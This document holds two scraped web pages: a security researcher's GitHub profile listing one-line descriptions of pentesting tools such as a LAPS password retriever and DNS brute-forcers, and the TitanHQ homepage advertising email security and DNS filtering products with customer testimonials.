=== Content from github.com_c46645f1_20250119_112643.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffelmoltor)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffelmoltor)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@felmoltor](https://avatars.githubusercontent.com/u/846513?s=64&v=4)

**felmoltor**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ffelmoltor)

[Overview](/felmoltor)
[Repositories
46](/felmoltor?tab=repositories)
[Projects
0](/felmoltor?tab=projects)
[Packages
1](/felmoltor?tab=packages)
[Stars
130](/felmoltor?tab=stars)

More

* [Overview](/felmoltor)
* [Repositories](/felmoltor?tab=repositories)
* [Projects](/felmoltor?tab=projects)
* [Packages](/felmoltor?tab=packages)
* [Stars](/felmoltor?tab=stars)

![@felmoltor](https://avatars.githubusercontent.com/u/846513?s=64&v=4)

**felmoltor**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ffelmoltor)

[![View felmoltor's full-sized avatar](https://avatars.githubusercontent.com/u/846513?v=4)](https://avatars.githubusercontent.com/u/846513?v=4)
üçä

Is this real life?

# Felipe Molina felmoltor

üçä

Is this real life?

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ffelmoltor)

[52
followers](https://github.com/felmoltor?tab=followers) ¬∑ [13
following](https://github.com/felmoltor?tab=following)

* Orange Cyberdefense
* Madrid / Ja√©n / London
* Mastodon

  [@felmoltor@infosec.exchange](https://infosec.exchange/%40felmoltor)
* X
  [@felmoltor](https://x.com/felmoltor)

## [Achievements](/felmoltor?tab=achievements)

[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default-39c6aec8ff89.png)](/felmoltor?achievement=quickdraw&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/felmoltor?achievement=yolo&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/felmoltor?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)](/felmoltor?achievement=pull-shark&tab=achievements)[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)](/felmoltor?achievement=starstruck&tab=achievements)
## [Achievements](/felmoltor?tab=achievements)

[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default-39c6aec8ff89.png)](/felmoltor?achievement=quickdraw&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/felmoltor?achievement=yolo&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/felmoltor?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)](/felmoltor?achievement=pull-shark&tab=achievements)[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)](/felmoltor?achievement=starstruck&tab=achievements)

Block or Report

# Block or report felmoltor

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this user‚Äôs behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=felmoltor+%28user%29)

[Overview](/felmoltor)
[Repositories
46](/felmoltor?tab=repositories)
[Projects
0](/felmoltor?tab=projects)
[Packages
1](/felmoltor?tab=packages)
[Stars
130](/felmoltor?tab=stars)

More

* [Overview](/felmoltor)
* [Repositories](/felmoltor?tab=repositories)
* [Projects](/felmoltor?tab=projects)
* [Packages](/felmoltor?tab=packages)
* [Stars](/felmoltor?tab=stars)

[felmoltor](/felmoltor/felmoltor)/README.md

### Hi there üëã

* üî≠ I'm Felipe Molina, currently working at SensePost group of Orange Cyberdefense üüß.
* ‚ûï Many of my personal repos are from the past, but some others are recent and can be found in the [SensePost github](https://github.com/sensepost).
* ‚ö° Fun fact about me: I am not an AI!
* üì´ My Mastodon profile:
  [Mastodon](https://infosec.exchange/%40felmoltor)

## Popular repositories Loading

1. [goLAPS](/felmoltor/goLAPS) goLAPS
   Public

   Retrieve LAPS passwords from a domain. The tools is inspired in pyLAPS.

   Go

   [29](/felmoltor/goLAPS/stargazers)
   [2](/felmoltor/goLAPS/forks)
2. [Keepnote\_import\_nmap](/felmoltor/Keepnote_import_nmap) Keepnote\_import\_nmap
   Public

   Plugin for keepnote to import a XML nmap file

   Python

   [26](/felmoltor/Keepnote_import_nmap/stargazers)
   [9](/felmoltor/Keepnote_import_nmap/forks)
3. [DNSSnoopDogg](/felmoltor/DNSSnoopDogg) DNSSnoopDogg
   Public

   A better DNS Cache Snooping tool

   Ruby

   [18](/felmoltor/DNSSnoopDogg/stargazers)
   [5](/felmoltor/DNSSnoopDogg/forks)
4. [DNSBruteForcer](/felmoltor/DNSBruteForcer) DNSBruteForcer
   Public

   Zone transfer a domain from its own NS servers and bruteforce subdomains

   Ruby

   [12](/felmoltor/DNSBruteForcer/stargazers)
   [6](/felmoltor/DNSBruteForcer/forks)
5. [NVDparser](/felmoltor/NVDparser) NVDparser
   Public archive

   Access to NVD, download XML files, parse it and stores in sqlite3 database

   Python

   [9](/felmoltor/NVDparser/stargazers)
   [11](/felmoltor/NVDparser/forks)
6. [SlowlorisChecker](/felmoltor/SlowlorisChecker) SlowlorisChecker
   Public

   This is a simple script to check if some server could be affected by Slowloris attack (Not executing the attack itself)

   Ruby

   [8](/felmoltor/SlowlorisChecker/stargazers)
   [4](/felmoltor/SlowlorisChecker/forks)

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from www.titanhq.com_13d79b09_20250119_112645.html ===


JavaScript must be enabled in your browser to use this website without limitations.

 [Skip to content](#main)

* ![Ireland](https://www.titanhq.com/EE/img/locations/ireland.svg)

[![](https://www.titanhq.com/EE/img/logos/titan-hq-logo.svg)](https://www.titanhq.com/)
Back

* [Solutions](#Solutions)
  ### [All Solutions](https://www.titanhq.com/solutions/)

  + [![](https://www.titanhq.com/EE/img/logos/phish-titan.svg)
    ### Phishing Protection

    PhishTitan](https://www.titanhq.com/phishing-protection/)
  + [![](https://www.titanhq.com/EE/img/logos/spam-titan.svg)
    ### Email Anti-Spam Solution

    SpamTitan](https://www.titanhq.com/email-protection/)
  + [![](https://www.titanhq.com/EE/img/logos/web-titan.svg)
    ### DNS Filtering

    WebTitan](https://www.titanhq.com/dns-filtering/)
  + [![](https://www.titanhq.com/EE/img/logos/safe-titan.svg)
    ### Security Awareness

    SafeTitan](https://www.titanhq.com/security-awareness-training/)
  + [![](https://www.titanhq.com/EE/img/logos/arc-titan.svg)
    ### Email Archiving

    ArcTitan](https://www.titanhq.com/email-archiving/)
  + [![](https://www.titanhq.com/EE/img/logos/encrypt-titan.svg)
    ### Email Encryption

    EncryptTitan](https://www.titanhq.com/email-encryption/)
  ### TitanHQ Platform

  ## Discover the TitanHQ Platform

  [Titan HQ Platform](https://www.titanhq.com/cybersecurity-platform/)

  ### Find the right solution for you

  [Get A Quote](https://www.titanhq.com/get-a-quote/)
  [Bundles](https://www.titanhq.com/bundles/)
* [Pricing](https://www.titanhq.com/pricing-page/)
  ### [Pricing](https://www.titanhq.com/pricing-page/)

  + [Phishing Protection](https://www.titanhq.com/pricing-page/?product_type=phishtitan)
  + [Email Anti-Spam Solution](https://www.titanhq.com/pricing-page/?product_type=spamtitan)
  + [DNS Filtering](https://www.titanhq.com/pricing-page/?product_type=webtitan)
  + [Security Awareness](https://www.titanhq.com/pricing-page/?product_type=safetitan)
  + [Email Archiving](https://www.titanhq.com/pricing-page/?product_type=arctitan)
  + [Email Encryption](https://www.titanhq.com/pricing-page/?product_type=encrypttitan)
  ### [Bundles](https://www.titanhq.com/bundles/)

  + [Standard](https://www.titanhq.com/bundles/?product_type=standard)
  + [Plus](https://www.titanhq.com/bundles/?product_type=plus)
  + [Pro](https://www.titanhq.com/bundles/?product_type=pro)

  ### Pricing

  ## Competitive pricing for your cybersecurity needs

  [View Pricing](https://www.titanhq.com/pricing-page/)

  ### Find the right solution for you

  [Get A Quote](https://www.titanhq.com/get-a-quote/)
  [Bundles](https://www.titanhq.com/bundles/)
* Company
  + [About](https://www.titanhq.com/about/)
  + [Testimonials & Case Studies](https://www.titanhq.com/testimonials-case-studies/)
  + [Careers](https://www.titanhq.com/careers/)
  + [Branding](https://www.titanhq.com/branding/)
  + [Resources Hub](https://www.titanhq.com/resources-hub/)
  + [Events](https://www.titanhq.com/events/)
  + [Blog](https://www.titanhq.com/blog/)
  + [News](https://www.titanhq.com/news/)
  + [Videos](https://www.titanhq.com/videos-podcasts/)
  + [Awards](https://www.titanhq.com/about/awards/)

  ### TitanHQ Platform

  ## Find Out About The TitanHQ Platform

  [TitanHQ Platform](https://www.titanhq.com/cybersecurity-platform/)

  ### Find the right solution for you

  [Get A Quote](https://www.titanhq.com/get-a-quote/)
  [Bundles](https://www.titanhq.com/bundles/)
* [MSP Partners](https://www.titanhq.com/about/find-partners/)
  + [MSP Partner Program](https://www.titanhq.com/msp-partner-program/)
  + [Partner Portal](https://www.titanhq.com/partner-portal-login/)
  + [MSP Events](https://www.titanhq.com/events/)
  + [MSP Testimonials](https://www.titanhq.com/msp-testimonials/)

  ### MSP Partners

  ## Discover our MSP Partner Program

  [Learn More](https://www.titanhq.com/msp-partner-program/)

  ### Find the right solution for you

  [Get A Quote](https://www.titanhq.com/get-a-quote/)
  [Bundles](https://www.titanhq.com/bundles/)
* [Support](https://helpcenter.titanhq.com/support/home)
  ### [Support](https://helpcenter.titanhq.com/support/home)

  + [![](https://www.titanhq.com/EE/img/logos/phish-titan.svg)
    ### Phishing Protection

    PhishTitan](https://helpdesk.phishtitan.com/support/home)
  + [![](https://www.titanhq.com/EE/img/logos/spam-titan.svg)
    ### Email Anti-Spam Solution

    SpamTitan](https://helpdesk.spamtitan.com/support/home)
  + [![](https://www.titanhq.com/EE/img/logos/web-titan.svg)
    ### DNS Filtering

    WebTitan](https://helpdesk.webtitan.com/support/home)
  + [![](https://www.titanhq.com/EE/img/logos/safe-titan.svg)
    ### Security Awareness

    SafeTitan](https://help.safe.titanhq.com/support/home)
  + [![](https://www.titanhq.com/EE/img/logos/arc-titan.svg)
    ### Email Archiving

    ArcTitan](https://helpdesk.arctitan.com/support/home)
  + [![](https://www.titanhq.com/EE/img/logos/encrypt-titan.svg)
    ### Email Encryption

    EncryptTitan](https://helpdesk.encrypttitan.com/support/home)
  ### Support Hub

  ## TitanHQ‚Äôs Support Hub

  [View Support Hub](https://helpcenter.titanhq.com/support/home)

  ### Contact support team by phone or email

  [Contact Support](https://www.titanhq.com/contact/)
  [Support Hub](https://helpcenter.titanhq.com/support/home)
* + [Speak to an Expert](#titanhqhomepagechatbot-a5b6beab)
  + [Get Started](https://www.titanhq.com/sign-up/)

Menu
Close

[Speak to an Expert](#titanhqhomepagechatbot-a5b6beab)
[Get Started](https://www.titanhq.com/sign-up/)

[xml version="1.0" encoding="UTF-8"?
titan-hq-logo](https://www.titanhq.com/)

Close

Search

Search

Hit enter to search or ESC to close

Top searches

* [Cisco Umbrella‚Äôs No.1 Alternative](https://www.titanhq.com/dns-filtering/cisco-umbrella-alternative-features)
* [What‚Äôs the Best Barracuda Essentials Alternative?](https://www.titanhq.com/best-barracuda-essentials-alternatives)
* [Alternatives to DNSFilter](https://www.titanhq.com/dns-filter)

* [Proofpoint Alternative](https://www.titanhq.com/proofpoint-alternative-spamtitan)
* [Mimecast Email Archiving Alternative](https://www.titanhq.com/email-archiving/mimecast-alternative)
* [Compare Cisco Umbrella Pricing & WebTitan](https://www.titanhq.com/dns-filtering/cisco-umbrella-pricing-1)

## Cybersecurity solutions to *protect* your business

* Leading Cybersecurity Platform
* Microsoft 365 Protection
* AI Driven Email Security

[Get a Quote](https://www.titanhq.com/sign-up/)
[Speak to an Expert](#titanhqhomepagechatbot-a5b6beab)

### Cybersecurity Solutions

* [Phishing & Malware](https://www.titanhq.com/phishing-protection/)
* [Advanced BEC Protection](https://www.titanhq.com/phishing-protection/)
* [DNS Security](https://www.titanhq.com/dns-filtering/)
* [Email Archive M365](https://www.titanhq.com/email-archiving/)
* [Security Awareness Training](https://www.titanhq.com/security-awareness-training/)
* [Email Protection](https://www.titanhq.com/email-protection/)
* [All](https://www.titanhq.com/products/)

### Over 7,500 Secure Partners Worldwide!

* ![Nostro Logo Homepage](https://www.titanhq.com/images/uploads/logos/_webp/nostro_compressed_webp_40cd750bba9870f18aada2478b24840a.webp)
* ![Medicus Logo Homepage](https://www.titanhq.com/images/uploads/logos/_webp/medicus_compressed_webp_40cd750bba9870f18aada2478b24840a.webp)
* ![Eutelslat Logo Homepage](https://www.titanhq.com/images/uploads/logos/_webp/Eutelsat_logo_compressed_webp_40cd750bba9870f18aada2478b24840a.webp)
* ![Microsoft Home Logo](https://www.titanhq.com/images/uploads/logos/_webp/microsoft_logo_compressed_webp_40cd750bba9870f18aada2478b24840a.webp)

Benefits of using a TitanHQ Solution
## SaaS Cybersecurity Platform for MSPs

Best-in-class SaaS cybersecurity platform provides layered security for MSPs to prevent user vulnerability and generate recurring revenue from SMBs customers. TitanHQ solutions help MSPs scale while maintaining margins. Watch how this MSP achieved significant growth with TitanHQ

[Learn More](https://www.titanhq.com/msp-testimonials/)

## Advanced Phishing and BEC Protection

PhishTitan is a next-generation phishing protection and remediation solution that integrates directly with Microsoft 365, catching and remediating sophisticated phishing attacks Microsoft misses. Post-delivery remediation (PDR) allows you to remove all phishing emails from your user's inbox, removing risk instantly. Our curated and unique email threat intelligence data is unmatched in visibility, coverage, and accuracy.

[Learn More](https://www.titanhq.com/phishing-protection/)

## Threat Intelligence

Phishing protection using AI and a large language model (LLM) with proprietary threat intelligence currently not found in any other anti-phishing solution on the market from the leading cloud-based email security solutions provider for over 20 years. Unbeatable anti-phishing accuracy for zero-day attacks, with minimal false positive results.

[Learn More](https://www.titanhq.com/phishing-protection/)

![https://www.titanhq.com/images/uploads/homepage_2024/Case_study.jpg](https://www.titanhq.com/images/uploads/homepage_2024/Case_study.jpg?width=360)

![https://www.titanhq.com/images/uploads/homepage_2024/scroll-duo-2_compressed.jpg](https://www.titanhq.com/images/uploads/homepage_2024/scroll-duo-2_compressed.jpg?width=360)

![https://www.titanhq.com/images/uploads/homepage_2024/OS971A1_compressed.jpg](https://www.titanhq.com/images/uploads/homepage_2024/OS971A1_compressed.jpg?width=360)

## Leading Cybersecurity Solutions

### Phishing and Malware Prevention

[**PhishTitan**](https://www.titanhq.com/phishing-protection/ "{page_2451}") provides next-generation phishing protection & remediation. Our proprietary machine-learning algorithm integrates with [Microsoft 365](https://www.titanhq.com/email-protection/office-365-phishing-protection/), catching and remediating sophisticated phishing.

[Phishing Protection](https://www.titanhq.com/phishing-protection/)

### Email Phishing Protection

[**PhishTitan**](https://www.titanhq.com/phishing-protection/ "{page_2451}") integrates with Microsoft Outlook via API and [scans emails](https://www.titanhq.com/email-protection/scanning/) for the most dangerous malicious threats. Multiple layers of analysis and detection methods, offer unbeatable anti-phishing accuracy.

[Phishing Protection](https://www.titanhq.com/phishing-protection/)

### TitanHQ Solutions Bundles

TitanHQ provides flexible bundle solutions and plans designed to enhance your security posture through a consolidated, layered approach‚Äîensuring comprehensive protection for your customers.

[Bundles](https://www.titanhq.com/bundles/)

### Email Anti Spam Solution

[**SpamTitan advanced spam protection**](https://www.titanhq.com/email-protection/ "{page_1}") protects your business by blocking spam, viruses, malware, ransomware and links to malicious websites from your emails. Microsoft 365 friendly.

[Email Anti-Spam](https://www.titanhq.com/email-protection/)

### DNS Threat Protection and Content Filtering

[**WebTitan**](https://www.titanhq.com/dns-filtering/ "{page_2}") provides AI driven threat protection and advanced web content controls. DNS Filtering is one of the best ways to protect your users against online threats such as phishing and malware.

[DNS Filtering](https://www.titanhq.com/dns-filtering/)

### Email Archiving for M365

[**ArcTitan email archiving**](https://www.titanhq.com/email-archiving/ "{page_3}") is Office 365 integrated and automated with lightening fast email search, easy to set-up and cost friendly deployments.¬†[Email encryption](https://www.titanhq.com/email-encryption/) ensures protection against data loss.

[Email Archiving](https://www.titanhq.com/email-archiving/)

## To protect your business we have *solutions*.

* ### Phishing & Malware Prevention

  [Learn More](https://www.titanhq.com/phishing-protection)

  ### Phishing & Malware Prevention

  PhishTitan is a next-generation phishing protection and remediation solution powered by TitanHQ. Our proprietary machine-learning algorithm integrates directly with Microsoft 365, catching and remediating sophisticated phishing attacks Microsoft misses.

  [Learn More](https://www.titanhq.com/phishing-protection)
* ### BEC Attack Protection for M365

  [Learn More](https://www.titanhq.com/phishing-protection)

  ### BEC Attack Protection for M365

  Our multiple layers of analysis and detection methods, offer unbeatable anti-phishing accuracy for sophisticated BEC attacks.

  [Learn More](https://www.titanhq.com/phishing-protection)
* ### Advanced Spam Blocking

  [Learn More](https://www.titanhq.com/email-protection/)

  ### Advanced Spam Blocking

  Email security blocking phishing, malware, spam, viruses and other malicious email threats. SpamTitan email protection solutions provides advanced yet easy to use email protection for your business. Microsoft 365 friendly.

  [Learn More](https://www.titanhq.com/email-protection/)
* ### DNS Security

  [Learn More](https://www.titanhq.com/dns-filtering/)

  ### DNS Security

  DNS filtering and DNS security solution providing AI driven threat protection and advanced web content controls. DNS Filtering is one of the best ways to protect your users against online threats such as phishing and malware.

  [Learn More](https://www.titanhq.com/dns-filtering/)
* ### Content Filtering

  [Learn More](https://www.titanhq.com/dns-filtering/content-filtering/)

  ### Content Filtering

  Our content filtering solution eliminates malicious content at the source, blocking malware, phishing, viruses, ransomware & access to malicious sites.

  [Learn More](https://www.titanhq.com/dns-filtering/content-filtering/)
* ### Security Awareness Training

  [Learn More](https://www.titanhq.com/safetitan/)

  ### Security Awareness Training

  Advanced platform for real-time security awareness training combined with simulated phishing attacks. Provides MSPs with always-on phishing campaigns.

  [Learn More](https://www.titanhq.com/safetitan/)
* ### Email Archiving

  [Learn More](https://www.titanhq.com/email-archiving/)

  ### Email Archiving

  Email archiving solution that is Office 365 integrated and automated with lightening fast email search speeds, easy to set-up and cost friendly deployments. Our email archiving solution stores an email copy in the email archive turning that data into a repository for daily use. All business-critical data sent or received using email is securely stored and easily retrievable in ArcTitan.

  [Learn More](https://www.titanhq.com/email-archiving/)
* ### Email Encryption

  [Learn More](https://www.titanhq.com/email-encryption/data-leak-prevention/)

  ### Email Encryption

  EncryptTitan is a full featured encryption system for MSPs & Enterprises that allows users to exchange information securely via email. Prevent employees sharing unsecured data or employee misuse of email.

  [Learn More](https://www.titanhq.com/email-encryption/data-leak-prevention/)

[All Solutions](https://www.titanhq.com/products/)

* ![https://www.titanhq.com/images/uploads/homepage_2024/WT_-_Shortlist_2023.png](https://www.titanhq.com/images/uploads/homepage_2024/WT_-_Shortlist_2023.png?width=360)
* ![https://www.titanhq.com/images/uploads/homepage_2024/getapp_compressed.png](https://www.titanhq.com/images/uploads/homepage_2024/getapp_compressed.png?width=360)
* ![https://www.titanhq.com/images/uploads/homepage_2024/momentum_compressed.png](https://www.titanhq.com/images/uploads/homepage_2024/momentum_compressed.png?width=360)
* ![https://www.titanhq.com/images/uploads/homepage_2024/best-of-email-security_compressed.png](https://www.titanhq.com/images/uploads/homepage_2024/best-of-email-security_compressed.png?width=360)
* ![https://www.titanhq.com/images/uploads/homepage_2024/expert_insights_compressed.png](https://www.titanhq.com/images/uploads/homepage_2024/expert_insights_compressed.png?width=360)
* ![https://www.titanhq.com/images/uploads/homepage_2024/high_performer_compressed.png](https://www.titanhq.com/images/uploads/homepage_2024/high_performer_compressed.png?width=360)
* ![https://www.titanhq.com/images/uploads/homepage_2024/implementation_compressed.png](https://www.titanhq.com/images/uploads/homepage_2024/implementation_compressed.png?width=360)
* ![https://www.titanhq.com/images/uploads/homepage_2024/Software_advice_-_front_runners.png](https://www.titanhq.com/images/uploads/homepage_2024/Software_advice_-_front_runners.png?width=360)
* ![https://www.titanhq.com/images/uploads/homepage_2024/Channel_Program_Valued_Partner_badge.jpg](https://www.titanhq.com/images/uploads/homepage_2024/Channel_Program_Valued_Partner_badge.jpg?width=360)
* ![https://www.titanhq.com/images/uploads/homepage_2024/VB_Spam_Plus_Report_Award.png](https://www.titanhq.com/images/uploads/homepage_2024/VB_Spam_Plus_Report_Award.png?width=360)

## Hear from our *customers*

Mean City Media

This sounds hyperbolic, but it's easily the best purchase that I've made since I started this business, 15 or 16 years ago.

John Cole

Network and Security Engineer

Fox Computer Solutions Ltd

We have used ArcTitan since 2015, and it has never not found an email that we have searched for, on any occasion.
Email search is fast and easy - if I can't find it, it's not in the archive. We have never had any issues with any aspect of this product.

Mike F

Director

UK Company

Great service and fantastic support, found EncryptTitan recently and will be offering it to all my clients over the coming months. Does what is says on the tin.

Patrick

Owner

Anglo-Eastern Ship Management Ltd

WebTitan has saved us some money on web filtering. It‚Äôs a
much more economical solution compared to Cisco
Umbrella. And while it doesn‚Äôt improve the end user experience per se, it increases our IT team‚Äôs effectiveness at preventing users from accessing harmful content.

Michael M

Head of Infrastructure

M&M Golf Cars

Not having to completely recover the company
from a malware attack or from something that
came in through email, and not having to worry
about employees clicking on malicious links, are
themselves, aspects of a return on investment. One
malicious email with a bad attachment, or with a link
that leads to a bad attachment, is enough to take an
entire network down.

Benjamin J

Director of IT

3 Tek

In today‚Äôs cyber environment and proliferation of cyber threats, all SafeTitan‚Äôs features are impactful and help prepare our users and customers for the challenges facing all organizations from threat actors. The product was easy to setup and integrate into our operations.

Thomas

IT Manager

Greenqube

As a TitanHQ partner, we have used all their other products to help secure our customers. The addition of PhishTitan shows that TitanHQ is ever-evolving and advancing its tool stack to help businesses protect their data. PhishTitan is helping us layer in more protection right inside the M365 mailbox. With threat actors now having the assistance of AI to help them form their malicious email attacks, it is more important now than ever for us to utilize an AI-driven tool like PhishTitan.

Hunter McFadden

Owner

MegaWide

We have been using SpamTitan for our email security needs and are thoroughly impressed with their service. The support team is incredibly responsive, consistently providing fast email replies and making it easy to schedule meetings for more in-depth discussions. They offer clear, step-by-step guides for troubleshooting, which have been invaluable for our team.
One instance that stands out is when we exceeded our license limit. SpamTitan swiftly provided a temporary buffer license to accommodate our excess needs, ensuring our operations continued smoothly without any interruption. This level of support and flexibility is rare and much appreciated. We highly recommend SpamTitan for their exceptional customer service and reliable email security solutions.

Another GREAT Product from TitanHQ

What can i say besides i LOVE these guys. they are on top of things. we currently are using most of the products and they are so easy to integrate to our MS365. on boarding was easy, this gives the user a way to make the decisions on the emails legitimacy.

John F.

Network Admin

## The Latest Industry Insights

[All Resources](https://www.titanhq.com/resources/)

[Business
### Cisco Umbrella Alternatives and Competitors

![Cisco Umbrella Alternatives and Competitors](https://www.titanhq.com/images/uploads/homepage_2024/shutterstock_compressed.jpg?width=360)](https://www.titanhq.com/resources/webtitan-cloud-versus-opendns)
[Business
### Exchange Online Archiving vs. ArcTitan Email Archiving: Uncover the Key Differences

![Exchange Online Archiving vs. ArcTitan Email Archiving: Uncover the Key Differences](https://www.titanhq.com/images/uploads/homepage_2024/Rectangle_1_copy_15.jpg?width=360)](https://www.titanhq.com/resources/exchange-online-archiving-arctitan)
[Business
### Automated Phishing Simulation Success Report

![Automated Phishing Simulation Success Report](https://www.titanhq.com/images/uploads/homepage_2024/Rectangle_1_copy_18.jpg?width=360)](https://www.titanhq.com/resources/automated-phishing-simulation-success-report)

[All Resources](https://www.titanhq.com/resources/)

## Ready to get started?

* [Products](https://www.titanhq.com/products/)
* [About Us](https://www.titanhq.com/about/)

![Ready to get started?](https://www.titanhq.com/images/uploads/homepage_2024/shutterstock_796346011.jpg?width=)

Modal Content

[![](https://www.titanhq.com/EE/img/logos/titan.svg)](https://www.titanhq.com/)

TitanHQ is a trading name of Copperfasten Technologies, Registered in the Republic of Ireland No. 263031

![](https://www.titanhq.com/EE/img/logos/aicpa.png?width=50px)

Solutions

* [PhishTitan
  Phishing Protection](https://www.titanhq.com/phishing-protection/)
* [SpamTitan
  Email Anti-Spam Solution](https://www.titanhq.com/email-protection/)
* [WebTitan Web
  DNS Filtering](https://www.titanhq.com/dns-filtering/)
* [SafeTitan
  Security Awareness](https://www.titanhq.com/security-awareness-training/)
* [ArcTitan
  Email Archiving](https://www.titanhq.com/email-archiving/)
* [EncryptTitan
  Email Encryption](https://www.titanhq.com/email-encryption/)

Company

* [About Us](https://www.titanhq.com/about/)
* [Blog](https://www.titanhq.com/blog/)
* [Case Studies](https://www.titanhq.com/case-studies/)
* [Resources](https://www.titanhq.com/resources/)
* [News](https://www.titanhq.com/news/)
* [Careers](https://www.titanhq.com/careers/)
* [Sectors](https://www.titanhq.com/sectors/)
* [MSP Events](https://www.titanhq.com/events/)
* [Get a Quote](https://www.titanhq.com/get-a-quote/)

Popular Resources

* [Cisco Umbrella Alternative](https://www.titanhq.com/webtitan-cloud-verus-opendns/)
* [Barracuda Alternative](https://www.titanhq.com/barracuda-essentials-pricing/)
* [DNSFilter Alternative](https://www.titanhq.com/dns-filter/)
* [Proofpoint Alternative](https://www.titanhq.com/proofpoint-alternative-spamtitan/)
* [Mimecast Alternative](https://www.titanhq.com/mimecast-alternative-spamtitan/)
* [Cisco Umbrella Pricing](https://www.titanhq.com/cisco-umbrella-pricing/)
* [A.I. Driven Phishing Prevention](https://www.titanhq.com/email-protection/spamtitan-plus/)
* [KnowBe4 Alternative](https://www.titanhq.com/knowbe4-alternative/)
* [Employee Phishing Training Guide](https://www.titanhq.com/safetitan/employee-phishing-training/)
* [Glossary](https://www.titanhq.com/glossary/)

Support

* [Support Portal](https://helpcenter.titanhq.com/support/home)
* [MSP Partner Program](https://www.titanhq.com/msp-partner-program/)
* [Contact Us](https://www.titanhq.com/contact/)

¬© TitanHQ 2025. All rights reserved.

* [Terms & Conditions](https://www.titanhq.com/about/terms-conditions/)
* [Privacy Policy](https://www.titanhq.com/about/privacy-policy/)
